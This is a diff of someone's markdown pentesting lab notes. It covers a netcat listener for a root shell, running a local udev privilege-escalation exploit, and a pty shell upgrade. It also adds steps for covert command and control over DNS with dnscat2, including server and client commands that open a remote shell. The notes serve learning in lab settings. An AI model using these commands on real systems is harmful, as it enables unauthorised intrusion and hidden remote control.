@@ -23,7 +23,7 @@ run
 ```
 
 ### Root Access:
-nc listener on attacking machine: `sudo netcat -nlvp 443`
+netcat listener on attacking machine: `sudo netcat -nlvp 443`
 
 ```bash
 # meterpreter
@@ -40,7 +40,8 @@ cat /proc/net/netlink # search for a positive pid (udev's pid minus 1)
 ./exp 2708 # say 2708 the pid
 ```
 
-nc listener on attacking machine: `whoami`
+netcat listener on attacking machine: `whoami`
+
 A better shell (on the attacking machine):
 ```bash
 python -c "import pty;pty.spawn('/bin/bash')"
@@ -51,46 +52,51 @@ stty raw -echo; fg
 > You should have the root access
 {: .prompt-info}
 
+## DNS based command and control
+1. Setup an Authoritative DNS server
+2. Install dnscat2 on the server and client
+3. Get command and control over DNS
+
+Network traffic:
+![dns](/assets/img/dnscat2_traffic_blur.png)
+
 ## Setup an authoritative DNS server:
 If you are using AWS: [STOK’s video](https://youtu.be/p8wbebEgtDk)
 Else, (Still, watch that. It's a good learning src.) I made one: 
 1. Spin up a droplet. [droplet_setup]
-2. Setup domain
-3. Set low ttl for each DNS record type:
-4. [Get a domain name]
-5. Add your ip as nameserver //need more info
-
-## DNS based data exfiltration
-Src: tryhackme.com //link
-Steps:
-1. kdjf
+2. [Get a domain name](/posts/c2_over_dns/#get-a-domain-name) and point the nameservers to digitalocean nameservers
+3. Setup the domain on digitalocean
+4. Set low ttl for each DNS record type (It may take sometime for DNS propagation.)
 
 ## C2 using dnscat2
-Download dnscat2:
+Download dnscat2: `git clone https://github.com/iagox86/dnscat2.git`
 
 Server:
-```zsh
+```bash
 # mkdir tools; cd tools; git clone dnscat2; cd dnscat2/server
 sudo gem install bundler
-sudo chown -R tlab /var/lib/gems
+sudo chown -R <user_name> /var/lib/gems
 sudo apt install ruby-dev make gcc
 bundle install
+sudo ruby ./dnscat2.rb example.com # your domain name
+dnscat2> start --dns port=53531,domain=example.com # you'll get the secret value
 
-sudo ruby ./dnscat2.rb tlab.site # your domain name
-dnscat2> start --dns port=53531,domain=tlab.site # you'll get the secret value
 # on client
-sudo ./dnscat --dns port=53531,server=159.223.182.91 --secret=9101ccfc58f3f9af8
-912718cc573d95e
+sudo ./dnscat port=53531 --secret=<secret> example.com # or
+sudo ./dnscat --dns port=53531,server=<ip>--secret=<secret>
+
 # on server
 dnscat2>
 	windows
 	window -i 1 # session number of the connection
 	help # get shell
+	shell
+	# ctr+z to escape
+	windows # list
 	window -i 2 # go to the sh window
-	
-
 ```
 
 ## Active Directory setup
-1. Steps I used
-2. I found a good link //link . Yeah, I did just that
+[Active Directory on Azure](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)
+
+TCM security's PEH course is a good source to learn about Active Directory setup and pentesting.
